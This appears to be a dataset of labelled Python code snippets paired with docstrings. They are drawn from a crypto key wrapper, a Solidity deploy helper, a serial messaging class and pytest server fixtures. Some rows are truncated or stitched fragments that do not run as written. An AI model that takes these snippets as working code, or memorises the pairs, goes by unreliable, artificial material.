1	class PrivateKey(encoding.Encodable, StringFixer, object): SIZE = nacl.bindings.crypto_box_SECRETKEYBYTES def __init__(self, private_key, encoder=encoding.RawEncoder): private_key = encoder.decode(private_key) if not isinstance(private_key, bytes): raise TypeError("PrivateKey must be created from a 32 byte seed") if len(private_key) != self.SIZE: raise ValueError( "The secret key must be exactly %d bytes long" % self.SIZE) raw_public_key = nacl.bindings.crypto_scalarmult_base(private_key) self._private_key = private_key self.public_key = PublicKey(raw_public_key) def __bytes__(self): return self._private_key def generate(cls): return cls(random(PrivateKey.SIZE), encoder=encoding.RawEncoder) class Box(encoding.Encodable, StringFixer, object):	Private key for decrypting messages using the Curve25519 algorithm. .. warning:: This **must** be protected and remain secret. Anyone who knows the value of your :class:`~nacl.public.PrivateKey` can decrypt any message encrypted by the corresponding :class:`~nacl.public.PublicKey` :param private_key: The private key used to decrypt messages :param encoder: The encoder class used to decode the given keys :cvar SIZE: The size that the private key is required to be
1	class PublicKey(encoding.Encodable, StringFixer, object): SIZE = nacl.bindings.crypto_box_PUBLICKEYBYTES def __init__(self, public_key, encoder=encoding.RawEncoder): self._public_key = encoder.decode(public_key) if not isinstance(self._public_key, bytes): raise TypeError("PublicKey must be created from 32 bytes") if len(self._public_key) != self.SIZE: raise ValueError("The public key must be exactly %s bytes long" % self.SIZE) def __bytes__(self): return self._public_key class PrivateKey(encoding.Encodable, StringFixer, object):	The public key counterpart to an Curve25519 :class:`nacl.public.PrivateKey` for encrypting messages. :param public_key: [:class:`bytes`] Encoded Curve25519 public key :param encoder: A class that is able to decode the `public_key` :cvar SIZE: The size that the public key is required to be
1	def encrypt(self, plaintext, nonce, encoder=encoding.RawEncoder): if len(nonce) != self.NONCE_SIZE: raise ValueError( "The nonce must be exactly %s bytes long" % self.NONCE_SIZE, ) ciphertext = nacl.bindings.crypto_secretbox(plaintext, nonce, self._key) encoded_nonce = encoder.encode(nonce) encoded_ciphertext = encoder.encode(ciphertext) return EncryptedMessage._from_parts( encoded_nonce, encoded_ciphertext, encoder.encode(nonce + ciphertext), )	Encrypts the plaintext message using the given nonce and returns the ciphertext encoded with the encoder. .. warning:: It is **VITALLY** important that the nonce is a nonce, i.e. it is a number used only once for any given key. If you fail to do this, you compromise the privacy of the messages encrypted. Give your nonces a different prefix, or have one side use an odd counter and one an even counter. Just make sure they are different. :param plaintext: [:class:`bytes`] The plaintext message to encrypt :param nonce: [:class:`bytes`] The nonce to use in the encryption :param encoder: The encoder to use to encode the ciphertext :rtype: [:class:`nacl.utils.EncryptedMessage`]
1	def replace_name(contract_name, line): i = line.find(contract_name) return line[:i] + "Example" + line[i+len(contract_name):]	Replace name in contract line.
1	def read_contract(contract_path, verbose=False, seen_libs=None, replace=True): if seen_libs is None: seen_libs = set() contract_dir, contract_file = os.path.split(contract_path) contract_name = contract_file[:-4] output_lines = [] with open(contract_path) as f: for line in f: if line.startswith('import '): lib_name = line[line.find('"')+1:line.rfind('"')] lib_path = os.path.join(contract_dir, lib_name) if lib_path not in seen_libs: seen_libs.add(lib_path) output_lines.extend(read_contract(lib_path, verbose=False, seen_libs=seen_libs, replace=False)) output_lines.append('\n') print("Importing", lib_name) elif replace and (line.startswith('contract ' + contract_name) or \ line.startswith('function ' + contract_name)): output_lines.append(replace_name(contract_name, line)) else: output_lines.append(line) if verbose: print(''.join(output_lines)) return output_lines	Read a Solidity file and recursively expand imported contracts inline.
1	def deploy_contract(contract_lines): with tempfile.TemporaryDirectory() as truffle_dir: os.chdir(truffle_dir) subprocess.call('truffle init', shell=True) output_path = os.path.join(truffle_dir, 'contracts', 'Example.sol') with open(output_path, 'w') as f: f.writelines(contract_lines) subprocess.call('truffle deploy', shell=True)	Compile and deploy a contract using truffle with imports expanded inline.
1	def unpack(self, msg): self.size, self.seq, self.stamp.sec, self.stamp.nsec, = self.struct_header.unpack(msg)	de-serialized a received string into the class variables
2	def __str__(self): return 'seq={:04d}, size={:d}, stamp={:s}'.format(self.seq, self.size, str(self.stamp) )	overload str fnc
1	class ComHeader: struct_header = struct.Struct("=HIii") TYPE_ERROR = 0 TYPE_EMPTY = 1 TYPE_SYNC_REQUEST = 10 TYPE_SYNC = 11 def __init__(self, size = 0, seq = 0, sec = 0, nsec = 0): self.rx = False self.max_data_size = 0xFF self.size = np.uint16(size) self.seq = np.uint32(seq) self.stamp = Time(sec, nsec) self.data = [] def unpack(self, msg): self.size, self.seq, self.stamp.sec, self.stamp.nsec, = self.struct_header.unpack(msg) def pack(self): msg = self.struct_header.pack(len(self.data), self.seq, self.stamp.sec, self.stamp.nsec) return msg def __str__(self): return 'seq={:04d}, size={:d}, stamp={:s}'.format(self.seq, self.size, str(self.stamp) )	header class to handle message for serial communication
2	def __init__(self, port , baudrate = 115200, timeout = 1.0, xonxoff = False): ComHeader.__init__(self) self.com = serial.Serial() self.com.port = port self.com.baudrate = baudrate self.com.timeout = timeout self.com.xonxoff = xonxoff self.quit = False self.count_msg = 0	constructor
1	def close(self): try: self.com.close() except serial.serialutil.SerialException: print "Could close port: " + self.com.port	closes serial link
1	def open(self): try: self.com.open() self.com.flushInput() self.com.flushOutput() return True except serial.serialutil.SerialException: print "Could not open port: " + self.com.port self.close() return False	opens serial link
1	def clear(self): self.size = 0 self.data = ''	clears the message buffer
1	class ComMessage(ComHeader): struct_type = struct.Struct("=H") ComHeader.__init__(self) self.com = serial.Serial() self.com.port = port self.com.baudrate = baudrate self.com.timeout = timeout self.com.xonxoff = xonxoff self.quit = False self.count_msg = 0 def close(self): try: self.com.close() except serial.serialutil.SerialException: print "Could close port: " + self.com.port def open(self): try: self.com.open() self.com.flushInput() self.com.flushOutput() return True except serial.serialutil.SerialException: print "Could not open port: " + self.com.port self.close() return False def get_type(self): if (len(self.data) >= self.struct_type.size): msg = self.data[0 : self.struct_type.size] type, = self.struct_type.unpack(msg ) return type else : return ComHeader.TYPE_ERROR def get_object(self, object): object_size = object.struct.size + self.struct_type.size if (len(self.data) >= object_size): msg = self.data[self.struct_type.size : ] object.unpack(msg) return object def set_object(self, object): self.data = self.struct_type.pack(object.TYPE) + object.pack() self.size = len(self.data) return self def pop_type(self): if (len(self.data) >= self.struct_type.size): type, = self.struct_type.unpack(self.data[0:self.struct_type.size] ) self.data = self.data[self.struct_type.size:] return type elif (len(self.data) == 0): return ComHeader.TYPE_EMPTY else : return ComHeader.TYPE_ERROR def push_object(self, object): self.data = self.data + self.struct_type.pack(object.TYPE) + object.pack() self.size = len(self.data) def pop_object(self, object): if (len(self.data) >= object.struct.size): msg = self.data[0:object.struct.size] self.data = self.data[object.struct.size:] object.unpack(msg) return object def push_sync(self): self.stamp.set_to_now() self.data = self.data + self.struct_type.pack(self.TYPE_SYNC) self.size = len(self.data) def clear(self): self.size = 0 self.data = '' def receive(self): try: self.rx = False if(self.com.isOpen() == False): self.open() msg = self.com.read(self.struct_header.size) if(len(msg) != self.struct_header.size) : print "incorrect header received" self.com.flushInput() return self.rx self.unpack(msg) if(self.size >= self.max_data_size): print "incorrect header received, data size = " + str(self.size) self.com.flushInput() return self.rx self.data = self.com.read(self.size) if(len(self.data) != self.size) : print "incorrect data received" self.com.flushInput() return self.rx self.rx = True except struct.error as e: print "struct.error " + e except serial.SerialTimeoutException as e: print "serial.SerialTimeoutException " + e except serial.serialutil.SerialException as e: print "serial.serialutil.SerialException " + e return self.rx def send(self): try: self.seq = self.count_msg self.com.write(self.pack()) if(len(self.data) > 0): self.com.write(self.data) self.count_msg = self.count_msg + 1 except serial.SerialTimeoutException as e: print "serial.SerialTimeoutException = " + e except serial.serialutil.SerialException as e: print "serial.serialutil.SerialException = " + e	header class send messages via serial link
1	def set_to_now(self): t = time.time(); self.sec = int(t) self.nsec = int( (t - self.sec) * 1000 * 1000 * 1000)	sets the timestamp to now
1	def time(self): t = dt.datetime.fromtimestamp(self.sec) t = t + dt.timedelta( microseconds = self.nsec/1000) return t	returns the time stamp a datetime object
1	class Time: def __init__(self, sec = 0, nsec = 0): self.sec = np.int32(sec) self.nsec = np.int32(nsec) def set_to_now(self): t = time.time(); self.sec = int(t) self.nsec = int( (t - self.sec) * 1000 * 1000 * 1000) def time(self): t = dt.datetime.fromtimestamp(self.sec) t = t + dt.timedelta( microseconds = self.nsec/1000) return t def __str__(self): return self.time().strftime('%Y-%m-%d %H:%M:%S.%f')	class to handle time stamps in a ROS fashion (www.ros.org)
1	class _Getch: def __init__(self): try: self.impl = _GetchWindows() except ImportError: self.impl = _GetchUnix() def __call__(self): return self.impl() class _GetchUnix:	Gets a single character from standard input. Does not echo to the screen.
1	class ConfigNotFoundError(Exception): @yield_fixture(scope='session') def pyramid_server(request):	Raised when a given config file and path is not found.
1	def __init__(self, offline=True, debug=False, data=None, user="testuser", password="", index='dev', **kwargs): self.debug = debug if os.getenv('DEBUG') in (True, '1', 'Y', 'y'): self.debug = True super(DevpiServer, self).__init__(preserve_sys_path=True, **kwargs) self.offline = offline self.data = data self.server_dir = self.workspace / 'server' self.client_dir = self.workspace / 'client' self.user = user self.password = password self.index = index	Devpi Server instance. Parameters ---------- offline : `bool` Run in offline mode. Defaults to True data: `str` Filesystem path to a zipfile archive of the initial server data directory. If not set and in offline mode, it uses a pre-canned snapshot of a newly-created empty server.
1	def api(self, *args): client_args = ['devpi'] client_args.extend(args) client_args.extend(['--clientdir', self.client_dir]) log.info(' '.join(client_args)) captured = cStringIO() stdout = sys.stdout sys.stdout = captured try: devpi_client(client_args) return captured.getvalue() finally: sys.stdout = stdout	Client API.
1	class DockerServer(ServerClass): def __init__(self, server_type, cmd, get_args, env, image, labels={}): super(DockerServer, self).__init__(cmd, get_args, env) self._image = image self._labels = merge_dicts(labels, { 'server-fixtures': 'docker-server-fixtures', 'server-fixtures/server-type': server_type, 'server-fixtures/session-id': CONFIG.session_id, }) self._client = docker.from_env() self._container = None def launch(self): try: log.debug('Launching container') self._container = self._client.containers.run( image=self._image, name=self.name, command=[self._cmd] + self._get_args(), environment=self._env, labels=self._labels, detach=True, auto_remove=True, ) self._wait_until_running() log.debug('Container is running at %s', self.hostname) except docker.errors.ImageNotFound as err: log.warning("Failed to start container, image %s not found", self._image) log.debug(err) raise except docker.errors.APIError as e: log.warning("Failed to start container: %s", e) raise self.start() def run(self): try: self._container.wait() except docker.errors.APIError as e: log.warning("Error while waiting for container: %s", e) log.debug(self._container.logs()) def teardown(self): if not self._container: return try: self._container.stop() self._wait_until_terminated() except docker.errors.APIError as e: log.warning("Error when stopping the container: %s", e) @property def is_running(self): if not self._container: return False return self._get_status() == 'running' @property def hostname(self): if not self.is_running: raise ServerFixtureNotRunningException() return self._container.attrs['NetworkSettings']['IPAddress'] def _get_status(self): try: self._container.reload() return self._container.status except docker.errors.APIError as e: log.warning("Failed to get container status: %s", e) raise tries=28, delay=1, backoff=2, max_delay=10) def _wait_until_running(self): if not self.is_running: raise ServerFixtureNotRunningException() tries=28, delay=1, backoff=2, max_delay=10) def _wait_until_terminated(self): try: self._get_status() except docker.errors.APIError as e: if e.response.status_code == 404: return raise	Docker server class.
1	class EggInfo(EggInfoCommand): def run(self): if self.distribution.extras_require is None: self.distribution.extras_require = {} self.distribution.extras_require['tests'] = self.distribution.tests_require EggInfoCommand.run(self) def common_setup(src_dir):	Customisation of the package metadata creation. Changes are: - Save the test requirements into an extra called 'tests'
1	class GitRepo(Workspace): def __init__(self): super(GitRepo, self).__init__() self.api = Repo.init(self.workspace) self.uri = "file://%s" % self.workspace	Creates an empty Git repository in a temporary workspace. Cleans up on exit. Attributes ---------- uri : `str` repository base uri api : `git.Repo` handle to the repository
1	def __init__(self, proxy_rules=None, extra_cfg='', document_root=None, log_dir=None, **kwargs): self.proxy_rules = proxy_rules if proxy_rules is not None else {} if not is_rhel(): self.cfg_template = string.Template(self.cfg_modules_template + self.cfg_mpm_template + self.cfg_template + extra_cfg) else: self.cfg_template = string.Template(self.cfg_modules_template + self.cfg_rhel_template + self.cfg_mpm_template + self.cfg_template + extra_cfg) os.environ['DEBUG'] = '1' kwargs['hostname'] = kwargs.get('hostname', socket.gethostbyname(os.uname()[1])) super(HTTPDServer, self).__init__(**kwargs) self.document_root = document_root or self.workspace self.document_root = Path(self.document_root) self.log_dir = log_dir or self.workspace / 'logs' self.log_dir = Path(self.log_dir)	httpd Proxy Server Parameters ---------- proxy_rules: `dict` { proxy_src: proxy_dest }. Eg {'/downstream_url/' : server.uri} extra_cfg: `str` Any extra Apache config document_root : `str` Server document root, defaults to temporary workspace log_dir : `str` Server log directory, defaults to $(workspace)/logs
2	def pre_setup(self): self.config = self.workspace / 'httpd.conf' rules = [] for source in self.proxy_rules: rules.append("ProxyPass {0} {1}".format(source, self.proxy_rules[source])) rules.append("ProxyPassReverse {0} {1} \n".format(source, self.proxy_rules[source])) cfg = self.cfg_template.substitute( server_root=self.workspace, document_root=self.document_root, log_dir=self.log_dir, listen_addr="{host}:{port}".format(host=self.hostname, port=self.port), proxy_rules='\n'.join(rules), modules=CONFIG.httpd_modules, ) self.config.write_text(cfg) log.debug("=========== HTTPD Server Config =============\n{}".format(cfg)) (self.workspace / 'run').mkdir() if not os.path.exists(self.log_dir): self.log_dir.mkdir()	Write out the config file
1	def check_server_up(self): try: log.debug('accessing URL: {0}'.format(self.uri)) with self.handle_proxy(): resp = requests.get(self.uri) acceptable_codes = (200, 403) log.debug('Querying %s received response code %s' % (self.uri, resp.status_code)) return resp.status_code in acceptable_codes except requests.ConnectionError as e: log.debug("Server not up yet (%s).." % e) return False	Check the server is up by polling self.uri
1	def get(self, path, as_json=False, attempts=25): e = None for i in range(attempts): try: with self.handle_proxy(): returned = requests.get('http://%s:%d/%s' % (self.hostname, self.port, path)) return returned.json() if as_json else returned except (http_client.BadStatusLine, requests.ConnectionError) as e: time.sleep(int(i) / 10) pass raise e	Queries the server using requests.GET and returns the response object. Parameters ---------- path : `str` Path to the resource, relative to 'http://hostname:port/' as_json : `bool` Returns the json object if True. Defaults to False. attempts: `int` This function will retry up to `attempts` times on connection errors, to handle the server still waking up. Defaults to 25.
1	def post(self, path, data=None, attempts=25, as_json=False): e = None for i in range(attempts): try: with self.handle_proxy(): returned = requests.post('http://%s:%d/%s' % (self.hostname, self.port, path), data=data) return returned.json() if as_json else returned except (http_client.BadStatusLine, requests.ConnectionError) as e: time.sleep(int(i) / 10) pass raise e	Posts data to the server using requests.POST and returns the response object. Parameters ---------- path : `str` Path to the resource, relative to 'http://hostname:port/' as_json : `bool` Returns the json response if True. Defaults to False. attempts: `int` This function will retry up to `attempts` times on connection errors, to handle the server still waking up. Defaults to 25.
1	def load_plugins(self, plugins_repo, plugins=None): if not os.path.isdir(plugins_repo): raise ValueError('Plugin repository "%s" does not exist' % plugins_repo) available_plugins = dict(((os.path.splitext(os.path.basename(x))[0], os.path.join(plugins_repo, x)) for x in os.listdir(plugins_repo) if x.endswith('.hpi'))) if plugins is None: plugins = available_plugins.keys() else: if isinstance(plugins, six.string_types): plugins = [plugins] errors = [] for p in plugins: if p not in available_plugins: if p not in errors: errors.append(p) if errors: if len(errors) == 1: e = 'Plugin "%s" is not present in the repository' % errors[0] else: e = 'Plugins %s are not present in the repository' % sorted(errors) raise ValueError(e) for p in plugins: tgt = os.path.join(self.plugins_dir, '%s.hpi' % p) shutil.copy(available_plugins[p], tgt)	plugins_repo is the place from which the plugins can be copied to this jenskins instance is plugins is None, all plugins will be copied, else is should be a list of the plugin names
1	def get_data(self): try: data = self.queue.pop() except IndexError: return None, None try: data = cPickle.loads(data) except: try: data = data.decode('utf-8') except: pass if DEBUG: logger.info('got %s' % str(data)) t = None if isinstance(data, TimedMsg): d = data.value t = data.time elif isinstance(data, string_types): try: d = json.loads(data) except: d = data else: d = data return d, t	pops the latest off the queue, or None is there is none
1	def check_server_up(self): import pymongo from pymongo.errors import AutoReconnect, ConnectionFailure if not self.hostname: return False log.info("Connecting to Mongo at %s:%s" % (self.hostname, self.port)) try: self.api = pymongo.MongoClient(self.hostname, self.port, serverselectiontimeoutms=200) self.api.list_database_names() self.api = pymongo.MongoClient(self.hostname, self.port) return True except (AutoReconnect, ConnectionFailure) as e: pass return False	Test connection to the server.
1	class NotRunningInKubernetesException(Exception): pass class KubernetesServer(ServerClass):	Thrown when code is not running as a Pod inside a Kubernetes cluster.
1	def pre_setup(self): (self.workspace / 'db').mkdir() try: self.pg_bin = subprocess.check_output([CONFIG.pg_config_executable, "--bindir"]).decode('utf-8').rstrip() except OSError as e: msg = "Failed to get pg_config --bindir: " + text_type(e) print(msg) self._fail(msg) initdb_path = self.pg_bin + '/initdb' if not os.path.exists(initdb_path): msg = "Unable to find pg binary specified by pg_config: {} is not a file".format(initdb_path) print(msg) self._fail(msg) try: subprocess.check_call([initdb_path, str(self.workspace / 'db')]) except OSError as e: msg = "Failed to launch postgres: " + text_type(e) print(msg) self._fail(msg)	Find postgres server binary Set up connection parameters
1	class PostgresServer(TestServer): random_port = True def __init__(self, database_name="integration", skip_on_missing_postgres=False, **kwargs): self.database_name = database_name self._fail = pytest.skip if skip_on_missing_postgres else pytest.exit super(PostgresServer, self).__init__(workspace=None, delete=True, preserve_sys_path=False, **kwargs) def kill(self, retries=5): if hasattr(self, 'pid'): try: os.kill(self.pid, self.kill_signal) except OSError as e: if e.errno == errno.ESRCH: pass else: raise def pre_setup(self): (self.workspace / 'db').mkdir() try: self.pg_bin = subprocess.check_output([CONFIG.pg_config_executable, "--bindir"]).decode('utf-8').rstrip() except OSError as e: msg = "Failed to get pg_config --bindir: " + text_type(e) print(msg) self._fail(msg) initdb_path = self.pg_bin + '/initdb' if not os.path.exists(initdb_path): msg = "Unable to find pg binary specified by pg_config: {} is not a file".format(initdb_path) print(msg) self._fail(msg) try: subprocess.check_call([initdb_path, str(self.workspace / 'db')]) except OSError as e: msg = "Failed to launch postgres: " + text_type(e) print(msg) self._fail(msg) def connection_config(self): return { u'host': u'localhost', u'user': os.environ[u'USER'], u'port': self.port, u'database': self.database_name } def run_cmd(self): cmd = [ self.pg_bin + '/postgres', '-F', '-k', str(self.workspace / 'db'), '-D', str(self.workspace / 'db'), '-p', str(self.port), '-c', "log_min_messages=FATAL" ] return cmd def check_server_up(self): from psycopg2 import OperationalError try: print("Connecting to Postgres at localhost:{}".format(self.port)) with self.connect('postgres') as conn: conn.set_session(autocommit=True) with conn.cursor() as cursor: cursor.execute("CREATE DATABASE " + self.database_name) self.connection = self.connect(self.database_name) with open(self.workspace / 'db' / 'postmaster.pid', 'r') as f: self.pid = int(f.readline().rstrip()) return True except OperationalError as e: print("Could not connect to test postgres: {}".format(e)) return False def connect(self, database=None): import psycopg2 cfg = self.connection_config if database is not None: cfg[u'database'] = database return psycopg2.connect(**cfg)	Exposes a server.connect() method returning a raw psycopg2 connection. Also exposes a server.connection_config property returning a dict with connection parameters
1	def __init__(self, config_dir=None, config_filename=None, extra_config_vars=None, **kwargs): self.extra_config_vars = extra_config_vars if extra_config_vars is not None else {} self.config_dir = config_dir if config_dir is not None else os.getcwd() self.config_filename = config_filename if config_filename else 'testing.ini' self.working_config = None self.original_config = Path(self.config_dir) / self.config_filename os.environ['DEBUG'] = '1' kwargs['hostname'] = kwargs.get('hostname', socket.gethostbyname(os.uname()[1])) super(PyramidTestServer, self).__init__(preserve_sys_path=True, **kwargs)	Test server for a Pyramid project Parameters ---------- config_dir: Path to a directory to find the config file/s. Defaults to current working dir, and all .ini files in the directory will be made available for config file chaining. config_filename: Name of the main config file to use. Defaults to testing.ini. extra_config_vars: Dict of any extra entries to add to the file, as { section: { key: value } }
1	def pre_setup(self): self.working_config = self.workspace / self.config_filename for filename in glob.glob(os.path.join(self.config_dir, '*.ini')): shutil.copy(filename, self.workspace) Path.copy(self.original_config, self.working_config) parser = configparser.ConfigParser() parser.read(self.original_config) parser.set('server:main', 'port', str(self.port)) parser.set('server:main', 'host', self.hostname) [parser.set(section, k, v) for section, cfg in self.extra_config_vars.items() for (k, v) in cfg.items()] with open(str(self.working_config), 'w') as fp: parser.write(fp) try: parser.get('app:main', 'url_prefix') except configparser.NoOptionError: parser.set('app:main', 'url_prefix', '') # Set the uri to be the external hostname and the url prefix self._uri = "http://%s:%s/%s" % (os.uname()[1], self.port, parser.get('app:main', 'url_prefix'))	Make a copy of at the ini files and set the port number and host in the new testing.ini
1	def get_config(self): parser = configparser.ConfigParser({'here': self.workspace}) parser.read(self.config) return dict([(section, dict(parser.items(section))) for section in parser.sections() if not section.startswith('logger') and not section.startswith('formatter') and not section.startswith('handler')])	Convenience method to return our currently running config file as an items dictionary, skipping logging sections
1	class RedisTestServer(TestServerV2): def __init__(self, db=0, delete=True, **kwargs): global redis import redis super(RedisTestServer, self).__init__(delete=delete, **kwargs) self.db = db self._api = None self._port = self._get_port(6379) def api(self): if not self.hostname: raise "Redis not ready" if not self._api: self._api = redis.Redis(host=self.hostname, port=self.port, db=self.db) return self._api def cmd(self): return "redis-server" def cmd_local(self): return CONFIG.redis_executable def get_args(self, **kwargs): cmd = [ "--bind", self._listen_hostname, "--port", str(self.port), "--timeout", "0", "--loglevel", "notice", "--databases", "1", "--maxmemory", "2gb", "--maxmemory-policy", "noeviction", "--appendonly", "no", "--slowlog-log-slower-than", "-1", "--slowlog-max-len", "1024", ] return cmd @property def image(self): return CONFIG.redis_image def port(self): return self._port def check_server_up(self): print("pinging Redis at %s:%s db %s" % ( self.hostname, self.port, self.db )) if not self.hostname: return False try: return self.api.ping() except redis.ConnectionError as e: print("server not up yet (%s)" % e) return False	This will look for 'redis_executable' in configuration and use as the redis-server to run.
1	def check_server_up(self): log.info("Connecting to RethinkDB at {0}:{1}".format( self.hostname, self.port)) if not self.hostname: return False try: self.conn = rethinkdb.connect(host=self.hostname, port=self.port, db='test') return True except rethinkdb.RqlDriverError as err: log.warning(err) return False	Test connection to the server.
1	env): super(ServerClass, self).__init__() self.daemon = True self._id = get_random_id(SERVER_ID_LEN) self._cmd = cmd self._get_args = get_args self._env = env or {}	Initialise the server class. Server fixture will be started here.
1	def run(self): raise NotImplementedError("Concrete class should implement this")	In a new thread, wait for the server to return.
1	def is_running(self): raise NotImplementedError("Concrete class should implement this")	Tell if the server is running.
1	class ServerFixtureNotRunningException(Exception): pass class ServerFixtureNotTerminatedException(Exception):	Thrown when a kubernetes pod is not in running state.
1	class ServerFixtureNotTerminatedException(Exception): pass class ServerClass(threading.Thread):	Thrown when a kubernetes pod is still running.
1	class ServerThread(threading.Thread): def __init__(self, hostname, port, run_cmd, run_stdin=None, env=None, cwd=None): threading.Thread.__init__(self) self.hostname = hostname self.port = port self.run_cmd = run_cmd self.run_stdin = run_stdin self.daemon = True self.exit = False self.env = env or dict(os.environ) self.cwd = cwd or os.getcwd() if 'DEBUG' in os.environ: self.p = subprocess.Popen(self.run_cmd, env=self.env, cwd=self.cwd, stdin=subprocess.PIPE if run_stdin else None) else: self.p = subprocess.Popen(self.run_cmd, env=self.env, cwd=self.cwd, stdin=subprocess.PIPE if run_stdin else None, stdout=subprocess.PIPE, stderr=subprocess.PIPE) ProcessReader(self.p, self.p.stdout, False).start() ProcessReader(self.p, self.p.stderr, True).start() def run(self): log.debug("Running server: %s" % ' '.join(self.run_cmd)) log.debug("CWD: %s" % self.cwd) try: if self.run_stdin: log.debug("STDIN: %s" % self.run_stdin) self.p.stdin.write(self.run_stdin.encode('utf-8')) if self.p.stdin: self.p.stdin.close() self.p.wait() except OSError: if not self.exit: traceback.print_exc() class TestServer(Workspace):	Class for running the server in a thread
1	def document_root(self): file_dir = os.path.join(str(self.workspace), "files") if not os.path.exists(file_dir): os.mkdir(file_dir) return file_dir	This is the folder of files served up by this SimpleHTTPServer
1	class SimpleHTTPTestServer(HTTPTestServer): def __init__(self, workspace=None, delete=None, **kwargs): kwargs.pop("hostname", None) super(SimpleHTTPTestServer, self).__init__(workspace=workspace, delete=delete, hostname="0.0.0.0", **kwargs) self.cwd = self.document_root def uri(self): if self._uri: return self._uri return "http://%s:%s" % (socket.gethostname(), self.port) def run_cmd(self): http_server = 'http.server' if sys.version_info >= (3,0) else 'SimpleHTTPServer' return ["python", "-m", http_server, str(self.port)] def document_root(self): file_dir = os.path.join(str(self.workspace), "files") if not os.path.exists(file_dir): os.mkdir(file_dir) return file_dir	A Simple HTTP test server that serves up a folder of files over the web.
1	class SVNRepo(Workspace): def __init__(self): super(SVNRepo, self).__init__() self.run('svnadmin create .', capture=True) self.uri = "file://%s" % self.workspace	Creates an empty SVN repository in a temporary workspace. Cleans up on exit. Attributes ---------- uri : `str` repository base uri
1	class TempDir(object): def __init__(self, delete=True, temp_dir=None, force_dir=None): self.delete = delete self.created = False if force_dir: if temp_dir: raise RuntimeError("Either `temp_dir` or `force_dir` can be provided, not both") self.dir = force_dir else: if temp_dir and not os.path.exists(temp_dir): os.makedirs(temp_dir) self.dir = mkdtemp(dir=temp_dir) self.created = True if not os.path.exists(self.dir): os.makedirs(self.dir) self.created = True if self.created: get_log().info("Created tempdir at %s" % self.dir) def close(self): if self.delete and self.dir is not None: try: get_log().info('Deleting %s' % self.dir) shutil.rmtree(self.dir) except Exception as e: get_log().error('could not delete %s - %s' % (self.dir, e[0])) finally: self.dir = None def __enter__(self): return self.dir def __exit__(self, *_): self.close() def __del__(self): self.close() def copy_files(src, dest):	Context manager for a temporary directory. Examples -------- >>> import os >>> from pkgutils.cmdline import TempDir >>> with TempDir() as dir: ... print(os.path.exists(dir)) True >>> os.path.exists(dir) False
1	def get_port(self): if not self.random_port: return self.port_seed - int(hashlib.sha1((os.environ['USER'] + self.__class__.__name__).encode('utf-8')).hexdigest()[:3], 16) return get_ephemeral_port(host=self.hostname)	Pick repeatable but semi-random port based on hashed username, and the server class.
1	def pre_setup(self): pass	This should execute any setup required before starting the server
1	def run_cmd(self): raise NotImplementedError("Concrete class should implement this")	Child classes should implement this to return the commands needed to start the server
1	def run_stdin(self): return None	This is passed to the server as stdin
1	def post_setup(self): pass	This should execute any setup required after starting the server
1	def check_server_up(self): raise NotImplementedError("Concrete class should implement this")	This is called to see if the server is up
1	def wait_for_go(self, start_interval=0.1, retries_per_interval=3, retry_limit=28, base=2.0): if start_interval <= 0.0: raise ValueError('start interval must be positive!') interval = start_interval retry_count = retry_limit start_time = datetime.now() while retry_count > 0: for _ in range(retries_per_interval): log.debug('sleeping for %s before retrying (%d of %d)' % (interval, ((retry_limit + 1) - retry_count), retry_limit)) if self.check_server_up(): log.debug('waited %s for server to start successfully' % str(datetime.now() - start_time)) return time.sleep(interval) retry_count -= 1 interval *= base raise ValueError("Server failed to start up after waiting %s. Giving up!" % str(datetime.now() - start_time))	This is called to wait until the server has started running. Uses a binary exponential backoff algorithm to set wait interval between retries. This finds the happy medium between quick starting servers (e.g. in-memory DBs) while remaining useful for the slower starting servers (e.g. web servers). Parameters ---------- start_interval: ``float`` initial wait interval in seconds retries_per_interval: ``int`` number of retries before increasing waiting time retry_limit: ``int`` total number of retries to attempt before giving up base: ``float`` backoff multiplier
1	def kill(self, retries=5): if self.server: self.server.exit = True if self.dead: return try: self._find_and_kill(retries, self.kill_signal) except ServerNotDead: log.error("Server not dead after %d retries, trying with SIGKILL" % retries) try: self._find_and_kill(retries, signal.SIGKILL) except ServerNotDead: log.error("Server still not dead, giving up")	Kill all running versions of this server. Just killing the thread.server pid isn't good enough, it may have spawned children.
1	def teardown(self): self.kill() super(TestServer, self).teardown()	Called when tearing down this instance, eg in a context manager
1	def is_running(self): # return False if the process is not started yet if not self._proc: return False return self._proc.poll() is None	Check if the main process is still running.
1	def run(self, args, **kwargs): if 'env' not in kwargs: kwargs['env'] = self.env return super(VirtualEnv, self).run(args, **kwargs)	Add our cleaned shell environment into any subprocess execution
1	def run_with_coverage(self, *args, **kwargs): if 'env' not in kwargs: kwargs['env'] = self.env coverage = [str(self.python), str(self.coverage)] return run.run_with_coverage(*args, coverage=coverage, **kwargs)	Run a python script using coverage, run within this virtualenv. Assumes the coverage module is already installed. Parameters ---------- args: Args passed into `pytest_shutil.run.run_with_coverage` kwargs: Keyword arguments to pass to `pytest_shutil.run.run_with_coverage`
1	def install_package(self, pkg_name, installer='easy_install', build_egg=None): installed = [p for p in working_set if p.project_name == pkg_name] if not installed or installed[0].location.endswith('.egg'): if sys.platform == 'win32': installer = str(self.virtualenv / 'Scripts' / installer + '.exe') else: installer = str(self.virtualenv / 'bin' / installer) if not self.debug: installer += ' -q' else: pkg = installed[0] d = {'python': self.python, 'easy_install': self.easy_install, 'src_dir': pkg.location, 'name': pkg.project_name, 'version': pkg.version, 'pyversion': sysconfig.get_python_version(), } d['egg_file'] = Path(pkg.location) / 'dist' / ('%(name)s-%(version)s-py%(pyversion)s.egg' % d) if build_egg and not d['egg_file'].isfile(): self.run('cd %(src_dir)s; %(python)s setup.py -q bdist_egg' % d, capture=True) if build_egg or (build_egg is None and d['egg_file'].isfile()): cmd = '%(python)s %(easy_install)s %(egg_file)s' % d else: cmd = 'cd %(src_dir)s; %(python)s setup.py -q develop' % d self.run(cmd, capture=False)	Install a given package name. If it's already setup in the test runtime environment, it will use that. :param build_egg: `bool` Only used when the package is installed as a source checkout, otherwise it runs the installer to get it from PyPI. True: builds an egg and installs it False: Runs 'python setup.py develop' None (default): installs the egg if available in dist/, otherwise develops it
1	def installed_packages(self, package_type=None): if package_type is None: package_type = PackageEntry.ANY elif package_type not in PackageEntry.PACKAGE_TYPES: raise ValueError('invalid package_type parameter (%s)' % str(package_type)) res = {} code = "from pkg_resources import working_set\n"\ "for i in working_set: print(i.project_name + ' ' + i.version + ' ' + i.location)" lines = self.run([self.python, "-c", code], capture=True).split('\n') for line in [i.strip() for i in lines if i.strip()]: name, version, location = line.split() res[name] = PackageEntry(name, version, location) return res	Return a package dict with key = package name, value = version (or '')
